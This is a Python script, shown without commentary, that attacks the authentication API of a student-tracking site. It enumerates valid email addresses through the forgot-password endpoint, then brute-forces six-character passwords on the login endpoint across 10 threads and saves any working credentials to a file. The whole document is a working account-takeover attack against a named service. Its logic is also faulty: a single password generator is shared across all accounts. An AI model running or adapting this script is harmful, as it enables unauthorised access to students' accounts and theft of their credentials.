import requests
import itertools
import string
import concurrent.futures

def emailMaker():
    characters = string.ascii_letters + string.digits + '._%+-'
    domains = ['@gmail.com', '@icloud.com', '@naver.com']
    for length in range(2, 41):
        permutations = itertools.permutations(characters, length)
        for permutation in permutations:
            username = ''.join(permutation)
            for domain in domains:
                yield f"{username}{domain}"

def codeMaker():
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for code in itertools.product(chars, repeat=6):
        yield "".join(code)

def checkEmail(email):
    url = "https://www.revera-track.com/api/auth/forgot"
    payload = {
        "isFrontend": 1,
        "email": email,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        if response.text.strip() == "1":
            return True
        elif response.text.strip() == "0":
            return False
        else:
            print("Unknown response:", response.text.strip())
            return False
    else:
        print("Request failed with status code:", response.status_code)
        return False

def checkCreds(email, password):
    url = "https://www.revera-track.com/api/auth/login"
    payload = {
        "email": email,
        "password": password,
        "allowedLevels": [1],
        "appTarget": "student"
    }
    response = requests.post(url, json=payload)
    if response.status_code == 200 and response.json().get('logged_in'):
        return True
    else:
        return False

# File path to save the found credentials
output_file = "/Users/lung/Desktop/loser.txt"

# Maximum number of concurrent threads
max_threads = 10

# Iterate over emails and passwords, and save found credentials to file using thread pools
with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor, open(output_file, "a") as file:
    email_generator = emailMaker()
    password_generator = codeMaker()

    while True:
        email_batch = list(itertools.islice(email_generator, max_threads))
        if not email_batch:
            break

        future_to_email = {executor.submit(checkEmail, email): email for email in email_batch}
        concurrent.futures.wait(future_to_email)

        for future in future_to_email:
            email = future_to_email[future]
            if future.result():
                print("Email is valid:", email)
                password_batch = list(itertools.islice(password_generator, max_threads))
                future_to_password = {executor.submit(checkCreds, email, password): password for password in password_batch}
                concurrent.futures.wait(future_to_password)

                for future in future_to_password:
                    password = future_to_password[future]
                    if future.result():
                        print("Valid credentials found!")
                        credentials = "Email: {}, Password: {}\n".format(email, password)
                        file.write(credentials)
